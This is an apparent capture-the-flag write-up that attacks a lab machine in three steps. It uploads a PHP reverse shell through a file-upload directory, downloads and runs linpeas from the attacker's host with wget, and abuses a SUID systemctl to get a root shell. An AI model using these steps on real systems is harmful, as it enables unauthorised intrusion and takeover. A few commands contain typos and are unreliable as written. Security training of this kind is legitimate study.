## Recon
- nmap search:
	- PORT     STATE SERVICE     VERSION
		21/tcp   open  ftp         vsftpd 3.0.5 <- very secure file transfer protocol 
		22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
		139/tcp  open  netbios-ssn Samba smbd 4
		445/tcp  open  netbios-ssn Samba smbd 4
		3128/tcp open  http-proxy  Squid http proxy 4.10 <- a widely used, open-source caching and forwarding web proxy that acts as an intermediary between clients and destination servers
		3333/tcp open  http        Apache httpd 2.4.41 ((Ubuntu)) 
- Nothing interesting found so since there is a web server running on port 3333 lets do a brute force directories.
- And a directory called  /internal is found which we can upload a file into it.
## Gaining access 
- While checking which type of file can be uploaded by using burpsuite or manual it accepts a .phtml file.
- So we can make a reverse shell with the php-reverse-shell.php file after changing it to php-reverse-shell.phtml.
- then we listen in our machine , nc -lvnp  4444 , so when we go to the /internal/php-reverse-shell.phtml it will give us a shell.
## Privilege Escalation 
- After getting a shell manual search can be done but it is easier to import linpeas and make it do the job. 
	- In the attacking machine we open a web server using python where the linpeas file exist,
		- sudo python3 -m http,server 80
	- in the target machine we try to get the file
		- wget http://http://tun0/linpeas.sh
		- chmod +x linpeas.sh
		- ./linpeas.sh
	- then linpeas will run and find the SUID file we want.
		-  -rwsr-xr-x 1 root root 974K Jun 17  2024 /bin/systemctl
		- or using this command you can find the same result:
			- find / -xdev -perm -4000 -type f -exec ls -la {} \; 2>/dev/null
	- then we use the /bin/systemctl to escalate our privilege.
		- we can use the command found in [GIFOBins](https://gtfobins.org/gtfobins/systemctl/#inherit) : 
			1. echo '[Service]' > /tmp/exploit.service && echo 'Type=oneshot' >> /tmp/exploit.service && echo 'ExecStart=/bin/chmod u+s /bin/bash' >> /tmp/exploit.service && echo '[Install]' >> /tmp/exploit.service && echo 'WantedBy=multi-user.target' >> /tmp/exploit.service
			2. Verify if it created correctly: cat /tmp/exploit.service
			3. Link to the systemd : systemctl link /tmp/exploit.service
			4. Start the service : systemctl enable --now /tmp/exploit.service
			5. Check if bash is SUID: ls -la /bin/bash
			6. Get root shell : /bin/bash -p
- Why this worked is because /bin/systemctl  was a SUID user  -rwsr-xr-x ,The 's' means: Anyone who runs this runs as ROOT!.
- Then we created a service file as shown before which will  run  /bin/chmod u+s /bin/bash and adds SUID to  /bin/bash.
- Then we got root by /bin/bash -p , The '-p' tells bash to run with SUID privileges.